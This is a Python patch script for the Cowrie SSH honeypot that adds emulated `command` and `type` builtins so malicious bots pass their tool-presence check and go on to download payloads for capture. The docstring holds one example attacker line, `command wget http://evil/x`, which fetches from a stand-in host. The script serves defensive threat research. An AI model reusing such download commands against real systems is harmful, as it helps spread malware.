#!/usr/bin/env python3
"""Patch cowrie/commands/which.py: add the `command` and `type` builtins.

WHY (measured on the arm deployment): 482 bot probes failed on
`command -v python3` / `! command -v curl` — the tool-presence gate a large
family runs BEFORE its download stage. Cowrie ships neither `command` nor
`type`, so the gate errored and the bot disengaged without dropping a payload.
The fake filesystem already contains /usr/bin/{python3,curl,wget,perl,...}, so
the tools "exist"; only the resolver was missing. Closing this gate is the
single highest-value capture fix — it lets the profiler family proceed to the
download ShardLure captures.

`which` is the natural home: same name-resolution family, already in
command_modules, so no edit to the module list.

Behaviour (byte-matched to bash):
  command -v NAME   -> resolved path (or bare NAME for a shell builtin), exit 0;
                       nothing, exit 1 if not found.
  command -V NAME   -> "NAME is /path" / "NAME is a shell builtin"; exit 1 if not.
  type NAME         -> like `command -V` (bash's `type` default).
  type -t NAME      -> "file" / "builtin"; empty + exit 1 if not found.
  command NAME ARGS -> DELEGATES to the real command via getCommand +
                       exec_command (v3.1.1's sudo.py/busybox.py pattern).
                       Without this a bot doing `command wget http://evil/x`
                       would silently no-op instead of downloading — worse for
                       capture than the bug.

v3.1.1 port (payload-yield Phase B Task 3): the pin-era version passed
--check on v3.1.1 and then crashed every session that used it. v3.1.1's
getCommand takes a cwd (`getCommand(self, cmd, paths, cwd)`, shell/protocol.py),
commands carry their own `self.cwd`, and `protocol.pp.insert_command` is gone,
so `command -v wget` raised TypeError and hung the session until the client
gave up. A text check cannot see that; scripts/behaviour's command-v-wget and
type-wget cases can. Errors now use the shell's own prefix ("bash: line 1: "
for an exec channel), as bash -c does.
"""
import sys
from pathlib import Path


# which.py's registry line after the two blank lines that end Command_which.
# NEW puts the registrations under a comment line, so OLD does not survive
# inside NEW and the pristine/patched/partial states stay distinct. Leaving
# Command_which's body alone keeps this clear of a later which-first patch.
OLD = """

commands["which"] = Command_which
"""

NEW = r'''

# --- ShardLure stealth: `command` and `type` builtins -----------------------
# See install/persona/patches/command-type-builtins.py for the why (the 482-fail
# download gate). These resolve against $PATH + the live command registry so a
# tool present in the fake FS reports as present, matching bash exactly.
from cowrie.shell.pipe import PipeProtocol  # noqa: E402


def _path_lookup(cmd, name):
    for p in cmd.environ.get("PATH", "").split(":"):
        if not p:
            continue
        cand = cmd.fs.resolve_path(name, p)
        if cmd.fs.exists(cand):
            return cand
    return None


def _resolve_target(cmd, name):
    """Return (kind, display) for NAME, or (None, None) if unresolved.

    kind is "builtin" (in the command registry, no filesystem path) or "file"
    (resolved on PATH in the fake FS). display is what bash prints for the path.
    """
    if "/" in name:
        rp = cmd.fs.resolve_path(name, cmd.cwd)
        if cmd.fs.exists(rp):
            return ("file", rp)
        return (None, None)
    # A file on PATH wins: that is what bash shows for wget, curl, python3.
    found = _path_lookup(cmd, name)
    if found is not None:
        return ("file", found)
    # Registered commands with no path form (cd, export ...): bash prints the
    # bare name for `command -v cd`. getCommand with no PATH entries answers
    # from the registry alone; v3.1.1 requires the cwd argument.
    if cmd.protocol.getCommand(name, [], cmd.cwd) is not None:
        return ("builtin", name)
    return (None, None)


class Command_command(HoneyPotCommand):
    resolve_args = False
    # `echo x | command cat` hands the pipe to the delegated command.
    consumes_stdin = True

    def start(self):
        args = list(self.args)
        # `command -v NAME` / `command -V NAME`: the honeypot-detection form.
        mode = None
        while args and args[0] in ("-v", "-V", "-p"):
            opt = args.pop(0)
            if opt in ("-v", "-V"):
                mode = opt
            # -p (use default PATH) changes nothing observable here; consume it.
        if mode:
            if not args:
                self.exit(1)
                return
            name = args[0]
            kind, disp = _resolve_target(self, name)
            if kind is None:
                # bash prints nothing for -v, a diagnostic for -V; both exit 1.
                if mode == "-V":
                    self.errorWrite(
                        f"{self.shell.error_prefix()}command: {name}: not found\n"
                    )
                self.exit(1)
                return
            if mode == "-v":
                self.write(f"{name if kind == 'builtin' else disp}\n")
            elif kind == "builtin":
                self.write(f"{name} is a shell builtin\n")
            else:
                self.write(f"{name} is {disp}\n")
            self.exit(0)
            return
        # Bare `command NAME ARGS...`: run the real command so a download still
        # happens, in this command's place (exec), exactly as sudo.py does.
        if not args:
            self.exit(0)
            return
        cmdclass = self.protocol.getCommand(
            args[0], self.environ.get("PATH", "").split(":"), self.cwd
        )
        if not cmdclass:
            self.errorWrite(self.shell.command_not_found_message(args[0]))
            self.exit(127)
            return
        pp = PipeProtocol(
            self.protocol,
            cmdclass,
            args[1:],
            self.input_data,
            self.pp.targets,
            cwd=self.cwd,
            user=self.user,
        )
        pp.stdin_from_pipe = self.pp.stdin_from_pipe
        self.exec_command(pp, cmdclass, *args[1:])


class Command_type(HoneyPotCommand):
    resolve_args = False

    def start(self):
        args = list(self.args)
        type_only = False
        while args and args[0] in ("-t", "-a", "-p", "-P", "-f"):
            opt = args.pop(0)
            if opt == "-t":
                type_only = True
        if not args:
            self.exit(0)
            return
        missing = 0
        for name in args:
            kind, disp = _resolve_target(self, name)
            if kind is None:
                if not type_only:
                    self.errorWrite(
                        f"{self.shell.error_prefix()}type: {name}: not found\n"
                    )
                missing += 1
                continue
            if type_only:
                self.write("builtin\n" if kind == "builtin" else "file\n")
            elif kind == "builtin":
                self.write(f"{name} is a shell builtin\n")
            else:
                self.write(f"{name} is {disp}\n")
        self.exit(1 if missing else 0)


# ShardLure: register the builtins beside which (command-type-builtins.py).
commands["which"] = Command_which
commands["command"] = Command_command
commands["type"] = Command_type
'''


def main() -> int:
    args = sys.argv[1:]
    if (len(args) not in (1, 2) or not args[0] or args[0] == "--check"
            or (len(args) == 2 and args[1] != "--check")):
        print(f"usage: {Path(sys.argv[0]).name} COWRIE_HOME [--check]", file=sys.stderr)
        return 2
    path = Path(args[0]) / "src/cowrie/commands/which.py"
    content = path.read_text(encoding="utf-8")
    old_count, new_count = content.count(OLD), content.count(NEW)
    if old_count == 0 and new_count == 1:
        print(f"  [skip] {path}: already patched")
        return 0
    if old_count != 1 or new_count != 0:
        print(
            f"  [FAIL] {path}: target is neither pristine nor fully patched "
            f"(OLD={old_count}, NEW={new_count}) — upstream which.py changed",
            file=sys.stderr,
        )
        return 1
    if len(args) == 2:
        print(f"  [check] {path}: compatible")
        return 0
    path.write_text(content.replace(OLD, NEW, 1), encoding="utf-8")
    print(f"  [ok] {path}: patched (command/type builtins)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
